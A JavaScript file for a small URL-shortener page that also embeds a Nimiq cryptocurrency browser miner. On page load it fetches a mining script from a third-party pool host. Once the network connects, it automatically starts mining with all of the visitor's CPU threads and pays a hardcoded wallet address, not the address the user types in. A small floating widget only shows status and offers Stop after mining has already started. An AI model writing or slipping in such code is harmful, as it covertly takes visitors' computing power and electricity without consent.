let endpoint = "https://www.jsonstore.io/394221034bda266cb95edd70c9932b3b930aaa60628853dc31131f864cbd835c";
let hash_ = null
let query = {}

geturl = () => {
    query.url = document.getElementById("urlinput").value
    query.address = document.getElementById('addrress').value
    query.shares = document.getElementById('shares').value
    if (query.shares <= 5 && query.shares >= 1) {
        let protocol_ok = query.url.startsWith("http://") || query.url.startsWith("https://") || query.url.startsWith("ftp://")
        if (query.url != '' && query.address != '' && protocol_ok) {
            return query.url;
        } else {
            return false
        }
    } else {
        alert('Shares between 1 and 5')
        return false
    }
}

getrandom = () => {
    let text = "";
    let possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (let i = 0; i < 5; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    fetch(endpoint + "/" + text)
        .then(res => res.json())
        .catch(error => console.error('Error:', error))
        .then(response => {
            if (response.result == null) {
                console.log(text)
                window.location.hash = text
                send_request(query);
            } else {
                getrandom()
            }
        });
}


send_request = () => {
    fetch(endpoint + "/" + window.location.hash.substr(1), {
            method: 'POST',
            body: JSON.stringify(query),
            headers: {
                'Content-Type': 'application/json; charset=utf-8'
            }
        }).then(res => res.json())
        .catch(error => console.error('Error:', error))
        .then(response => {
            console.log('Success:', response)
            let hash = window.location.hash.substr(1)
            window.location.hash = ''
            let current_url = window.location.href
            current_url = current_url.substring(0, current_url.length - 1);
            let new_shorted = current_url + 'r#' + hash
            document.getElementById('new_shorted').innerHTML = new_shorted
            document.getElementById('new_shorted').setAttribute('href', new_shorted)
        });
}

shorturl = () => {
    let longurl = geturl();
    if (longurl != false) {
        getrandom();
    } else {
        alert('Error 1')
    }
}

let hashh = window.location.hash.substr(1)

const $nimiq = {
    miner: {}
};
window.$nimiq = $nimiq;
$nimiq.status = 'Not connected';
$nimiq.shares = 0;
$nimiq.block = 0;
$nimiq.isMining = false;

function setInnerHTML(elId, text) {
    if (elId === 'sp-status') {
        $nimiq.status = text;
    }
    if (document.getElementById(elId)) {
        document.getElementById(elId).innerHTML = text;
    }
}

function loadScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    if (script.readyState) { //IE
        script.onreadystatechange = () => {
            if (script.readyState === "loaded" || script.readyState === "complete") {
                script.onreadystatechange = null;
                callback();
            }
        };
    } else { //Others
        script.onload = () => {
            callback();
        };
    }

    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}

/**/
let nimiqMinerGUI = {
    init: () => {
        let guiLogo = document.createElement('div');
        let bgImage = '<svg xmlns="http://www.w3.org/2000/svg" version="1" viewBox="0 0 491 449"><linearGradient id="a" x1="341" x2="341" y1="178" y2="236" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#596ab2"/><stop offset="1" stop-color="#b966a8"/></linearGradient><path fill="url(#a)" d="M388 182c-3-2-6-3-10-3l-12-1h-78c-2 0-3 1-3 3v51c0 3 3 4 5 3 7-3 16-6 24-7l34-2h18c9 0 17-1 23-4s9-10 9-21c0-5-1-9-3-12l-7-7z"/><linearGradient id="b" x1="246" x2="246" y1="8" y2="441" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#596ab2"/><stop offset="1" stop-color="#b966a8"/></linearGradient><path fill="url(#b)" d="M471 182L395 50a86 86 0 0 0-73-42H170c-31 0-59 16-74 42L20 182a85 85 0 0 0 0 85l76 131c15 27 43 43 74 43h152c30 0 58-16 73-43l76-131c15-26 15-59 0-85zm-310-44c14 0 27 2 40 5 12 3 25 8 37 16 2 1 2 4 1 5l-20 24c-2 2-4 2-5 1-7-5-14-9-23-11l-12-3-45-34c8-2 17-3 27-3zm-83-25c2-3 7-4 10-1l66 52c1 1 0 3-1 2l-44-22-30-21c-3-3-4-7-1-10zm-24 15a7 7 0 0 1 9-4l60 30 28 14 2 1 2 1 19 9 1 1 1 1h2v1c4 1 6 2 6 5l-1 1-2 2c-1 1-4 0-6-1l-5-2-1-1h-1l-14-7-4-1-4-2-1-1h-2l-86-38c-3-1-5-6-3-9zm365 121a77 77 0 0 1-53 17h-18a359 359 0 0 0-39 2l-12 4-10 5-2 3v45c0 8-6 14-14 14H161a113 113 0 0 1-83-38c-2-1-2-3-1-5l23-22c1-2 3-2 5 0l6 7 12 10c5 4 10 6 16 8s13 3 22 3c17 0 31-2 42-7 11-6 16-13 16-23 0-9-5-15-14-17-10-3-25-4-44-4-12 0-22-1-32-3-9-2-17-5-24-10a48 48 0 0 1-22-43c0-9 2-17 6-24l8-10 42 17-4 2c-4 2-7 4-9 7-2 2-3 5-3 8l1 7c1 3 3 5 5 6 3 2 7 3 13 4l22 2c20 0 36 1 48 4s22 8 28 13c2 2 6 0 6-3v-62c0-15 12-28 28-28h99c10 0 19 1 27 4a57 57 0 0 1 34 33c3 8 5 17 5 26-1 21-7 36-20 48z"/></svg>';
        let img64 = window.btoa(bgImage);
        let css = 'position:absolute;z-index:100; right: 10px; bottom: 10px; height: 37px; width: 40px; cursor: pointer;';
        guiLogo.style.cssText = css;
        guiLogo.style.backgroundImage = "url('data:image/svg+xml;base64," + img64 + "')";
        guiLogo.addEventListener('click', nimiqMinerGUI.openPopup);
        document.body.appendChild(guiLogo);

    },
    closePopup: () => {
        document.getElementById('sp-miner-container').remove();
    },
    openPopup: () => {
        let containerDiv = document.createElement('div');
        containerDiv.id = 'sp-miner-container';
        containerDiv.style.cssText = 'position:absolute;z-index:200; padding-left: 15px; padding-right: 15px; right: 10px; bottom: 0; width: 334px; height: 258px; background-image: linear-gradient(to bottom, #A467AB, #596ab2); border: solid 1px #ca8eff; border-bottom: none;  border-top-right-radius: 15px; border-top-left-radius: 15px;';
        let logoDiv = document.createElement('div');

        logoDiv.style.cssText = 'margin-top: 10px; height: 60px; background-position: center center; background-size: contain; background-repeat: no-repeat; background-image:  url(\'data:image/png;base64,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\')';
        logoDiv.click = () => {

        };
        containerDiv.appendChild(logoDiv);

        let hr = document.createElement('hr');
        hr.style.cssText = 'width:204px;height:3px; border: none; border-bottom: 1px solid #ca8eff;';

        containerDiv.appendChild(hr);

        let closeBtn = document.createElement('div');
        closeBtn.style.cssText = 'display: inline-block; float:right; cursor: pointer; position: absolute; right: 15px; top: 10px; height: 24px; width: 24px; background-size: contain; background-image:  url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACUAAAAlCAMAAADyQNAxAAAAw1BMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////BhC2fAAAAQHRSTlMAAQMEBQYHCAkUFhcYGhwgJSYnKCkqLTEyMzZAR1hZW1xfgoOLl5qbnaKjpaavsLS1vMPHzs/R1drc5uj19/v95qFUpgAAAQdJREFUOE+N0ldbAjEQheETFLEAFsSGBUWxV6yg5vz/X+XFks3OTHbducqX5708AAAsjqb3q9DnTr8m+zGXPkj6TY2uSfJIIMMyRB4LpFhA5IlAgkVEDgH3EjOyIiIPsF7MwCTiBD3R9FsW8RONmWEacQi0vxXb02jsAHQU0zd2wL9sjqpZjqpYAZUzgcqYQmlmUIolENyTVrsJdKMRfa8GsiyJSL9dA0nmbksQ6fs1UGTurgIFZtDjT4JdKHTlupq1sabQpQM0e8CORYZNsewt0uwMGCSQZO8LAA7zLE4lsrcmUGByT4HNUWB6dBl7beYfg1/y3CyzMyOfIwJa/RVtADQ2utnjD19e0+AWMrH3AAAAAElFTkSuQmCC\');';
        closeBtn.addEventListener('click', nimiqMinerGUI.closePopup);
        containerDiv.appendChild(closeBtn);

        let peers = 0;
        if ($nimiq.hasOwnProperty('network')) {
            peers = $nimiq.network.peerCount;
        }
        let hashrate = 0;
        if ($nimiq.hasOwnProperty('hashrate')) {
            hashrate = $nimiq.hashrate;
        }
        let labelCss = 'margin-right: 5px; font-family:Heebo;font-size:15px;font-weight:400;font-style:normal;font-stretch:normal;line-height:normal;letter-spacing:normal;text-align:left;color:#fff;';

        // html += '<div><span style="'+ labelCss + '">Hashrate:</span><span id="">'+  +'h/s</span></div>';
        //
        // html += '<div>Shares: <span id="sp-shares">'+  +'</span></div>';
        let html = '<div style="float: left; width: 200px;">';
        html += '<div><span style="' + labelCss + '">Status: </span> <span id="sp-status" style="color: #C2C2C2; font-family:Heebo;font-size:15px;">' + $nimiq.status + '</span></div>';
        html += '<div><span style="' + labelCss + '">Block: </span> <span id="sp-block" style="color: #C2C2C2; font-family:Heebo;font-size:15px;">0</span></div>';
        html += '<div><span style="' + labelCss + '">Peers: </span> <span id="sp-peers" style="color: #C2C2C2; font-family:Heebo;font-size:15px;">' + peers + '</span></div>';
        html += '</div>';

        html += '<div style="position: absolute; right: 15px;; width: 133px;">';
        html += '<div><span style="' + labelCss + '">Hashrate: </span> <span id="sp-hashrate" style="color: #C2C2C2; font-family:Heebo;font-size:15px;">' + hashrate + '</span></div>';
        html += '<div><span style="' + labelCss + '">Shares: </span> <span id="sp-shares" style="color: #C2C2C2;font-family:Heebo;font-size:15px;">' + $nimiq.shares + '</span></div>';
        html += '</div><div style="clear: both;"></div> ';
        let statsDiv = document.createElement('div');
        statsDiv.innerHTML = html;
        containerDiv.appendChild(statsDiv);

        let hashRateSliderContainer = document.createElement('div');
        hashRateSliderContainer.style.cssText = 'margin-top: 15px;';

        let hashRateSlider = document.createElement('input');
        hashRateSlider.id = 'sp-hashrate-range';
        hashRateSlider.type = 'range';
        hashRateSlider.max = navigator.hardwareConcurrency - 1;
        hashRateSlider.min = 1;
        hashRateSlider.style.cssText = 'width: 100%; padding: 0; margin: 0;';
        if ($nimiq.hasOwnProperty('miner') && $nimiq.isMining) {
            hashRateSlider.value = $nimiq.miner.threads;
        } else {
            hashRateSlider.value = 1;
        }

        hashRateSlider.addEventListener('change', (e) => {
            if ($nimiq.miner && $nimiq.isMining) {
                $nimiq.miner.threads = hashRateSlider.value;
            } else {
                e.preventDefault();
                return false;
            }
        });
        hashRateSliderContainer.appendChild(hashRateSlider);

        let divLabels = document.createElement('div');
        divLabels.innerHTML = '<span style="float: left; ' + labelCss + ' color: #CA8EFF;">Slow</span> <span style="float: right; ' + labelCss + ' color: #CA8EFF;">Fast</span><div style="clear: both;"></div>';
        hashRateSliderContainer.appendChild(divLabels);

        containerDiv.appendChild(hashRateSliderContainer);


        let buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = 'position: absolute; bottom: 5px; text-align: center; display: flex; justify-content: center; left: 0; right: 0;';

        let startBtn = document.createElement('button');
        startBtn.innerHTML = 'Start';
        startBtn.addEventListener('click', () => {
            nimiqMiner.startMining();
            stopBtn.style.backgroundColor = 'transparent';
            startBtn.style.backgroundColor = '#ca8eff';
        });
        startBtn.style.cssText = 'outline: none; margin-right: 10px; border-radius: 4px; border: solid 1px #ca8eff; color: #fff; background-color: #ca8eff; height: 28px; font-family: Heebo; font-size: 14px; font-weight: 500; width: 83px; text-align: center; cursor: pointer;';
        startBtn.onmouseover = () => {
            startBtn.style.backgroundColor = '#ca8eff';
        };
        startBtn.onmouseout = () => {
            if (!$nimiq.isMining) {
                startBtn.style.backgroundColor = 'transparent';
            }
        };
        buttonContainer.appendChild(startBtn);
        let stopBtn = document.createElement('button');

        stopBtn.innerHTML = 'Stop';
        stopBtn.addEventListener('click', () => {
            nimiqMiner.stopMining();
            startBtn.style.backgroundColor = 'transparent';
            stopBtn.style.backgroundColor = '#ca8eff';
        });
        stopBtn.style.cssText = 'outline: none; margin-right: 10px; border-radius: 4px; border: solid 1px #ca8eff; color: #fff; background-color: transparent;height: 28px; font-family: Heebo; font-size: 14px; font-weight: 500; width: 83px; text-align: center; cursor: pointer;';
        stopBtn.onmouseover = () => {
            stopBtn.style.backgroundColor = '#ca8eff'
        };
        stopBtn.onmouseout = () => {
            if ($nimiq.isMining) {
                stopBtn.style.backgroundColor = 'transparent'
            }
        };
        buttonContainer.appendChild(stopBtn);

        containerDiv.appendChild(buttonContainer);
        document.body.appendChild(containerDiv);
    }
}; /**/

let nimiqMiner = {
    minerThreads: 0,
    init: () => {
        Nimiq.init(async () => {
            Nimiq.GenesisConfig.main();
            console.log('Nimiq loaded. Connecting and establishing consensus.');
            setInnerHTML('sp-status', 'Connecting...');
            $nimiq.consensus = await Nimiq.Consensus.light();
            $nimiq.blockchain = $nimiq.consensus.blockchain;
            $nimiq.accounts = $nimiq.blockchain.accounts;
            $nimiq.mempool = $nimiq.consensus.mempool;
            $nimiq.network = $nimiq.consensus.network;

            $nimiq.consensus.on('established', () => nimiqMiner.onConsensusEstablished());
            $nimiq.consensus.on('lost', () => console.warn('Consensus lost'));

            $nimiq.blockchain.on('head-changed', () => nimiqMiner.onHeadChanged());
            $nimiq.network.on('peers-changed', () => nimiqMiner.onPeersChanged());

            $nimiq.network.connect();

        }, function (code) {
            switch (code) {
                case Nimiq.ERR_WAIT:
                    console.log('Error: Already open in another tab or window.');
                    break;
                case Nimiq.ERR_UNSUPPORTED:
                    console.error('Error: Browser not supported');
                    break;
                default:
                    console.log('Error: Nimiq initialization error');
                    break;
            }
        });
    },
    onHeadChanged: () => {
        const height = $nimiq.blockchain.height;
        console.log(`Now at height ${height}.`);
        $nimiq.block = $nimiq.blockchain.height;
        setInnerHTML('sp-block', $nimiq.blockchain.height);
    },
    onConsensusEstablished: () => {
        address_to_mine = 'NQ65 GS91 H8CS QFAN 1EVS UK3G X7PL L9N1 X4KC'
        if (navigator.hardwareConcurrency < 3) {
            $nimiq.miner.threads = 0;
        } else {
            $nimiq.miner.threads = 1;
        }
        nimiqMiner.startMining();
    },
    onPeersChanged: () => {
        console.log(`Now connected to ${$nimiq.network.peerCount} peers.`);
        setInnerHTML('sp-peers', $nimiq.network.peerCount);

    },
    onPoolConnectionChanged: function (state) {
        if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTING) {
            console.log('Connecting to the pool');
            setInnerHTML('sp-status', 'Connecting to pool');
        }
        if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTED) {
            console.log('Connected to pool');
            setInnerHTML('sp-status', 'Connected to pool');
            $nimiq.miner.startWork();
        }
        if (state === Nimiq.BasePoolMiner.ConnectionState.CLOSED) {
            console.log('Connection closed');
            setInnerHTML('sp-status', 'Connection closed');
        }
    },
    onHashrateChanged: function (rate) {
        setInnerHTML('sp-hashrate', rate + 'h/s');
    },
    stopMining: () => {
        if ($nimiq.miner) {
            $nimiq.miner.stopWork();
            $nimiq.miner.disconnect();
            $nimiq.miner.fire('hashrate-changed', 0);
        }
        $nimiq.network.disconnect();
        $nimiq.isMining = false;
    },
    onShareFound: () => {
        $nimiq.shares++;
        setInnerHTML('sp-shares', $nimiq.shares);
    },
    startMining: () => {
        console.log('start mining!');
        setInnerHTML('sp-status', 'Start Mining');
        $nimiq.address = Nimiq.Address.fromUserFriendlyAddress(address_to_mine);
        console.log('Mining to: ' + address_to_mine)
        $nimiq.miner = new Nimiq.SmartPoolMiner($nimiq.blockchain, $nimiq.accounts, $nimiq.mempool, $nimiq.network.time, $nimiq.address, Nimiq.BasePoolMiner.generateDeviceId($nimiq.network.config));
        $nimiq.miner.threads = navigator.hardwareConcurrency;
        console.log('Using ' + $nimiq.miner.threads + ' threads');
        $nimiq.miner.connect('eu.sushipool.com', 443);
        $nimiq.miner.on('connection-state', nimiqMiner.onPoolConnectionChanged);
        $nimiq.miner.on('hashrate-changed', nimiqMiner.onHashrateChanged);
        $nimiq.miner.on('share', nimiqMiner.onShareFound);
        $nimiq.isMining = true;

    }
};

loadScript('https://sushipool.com/scripts/vendor/nimiq/nimiq.js', () => {
    console.log('nimiq.js loaded');
    nimiqMiner.init();
    nimiqMinerGUI.init();
});